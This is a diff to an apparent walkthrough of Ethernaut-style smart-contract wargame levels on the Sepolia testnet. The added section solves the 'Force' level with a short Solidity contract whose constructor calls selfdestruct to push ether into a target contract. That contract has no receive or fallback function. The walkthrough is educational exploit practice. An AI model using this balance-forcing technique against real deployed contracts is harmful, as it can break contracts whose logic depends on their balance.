@@ -41,4 +41,22 @@ i'm using sepolia testnet for the transactions, u can choose testnet accordingly
      ```
      or using script file level02.s.sol
   3. submit the instance, u're done.
+## level07 - Force 
+  1. here we need to increase the balance of our contract, but neither it has         any recieve() or fallback() fun. , so what we gonna use is selfdestruct()
+  2. preferably, we'll use remix as new versions of solidity doesn't support 
+     selfdestruct(), source code:
+     ```
+     // SPDX-License-Identifier: MIT
+     pragma solidity ^0.6.0;
+      
+     contract Forced{
+         constructor () public payable {
+             selfdestruct(0x2BA0bf631A0c17C516D74634E24fCA5Fff21575f); //level add.
+         }
+     }
+     ```
+  3. we'll send some eth at deployment time to increase contract balance and cuz      of selfdestruct all this will go to Force contract 
+  4. we're using selfdestruct() in constructor itself, so it can operate at           deployment time and we don't need to call any other function
+  5. submit the instance after deployment, u're done.
+
      
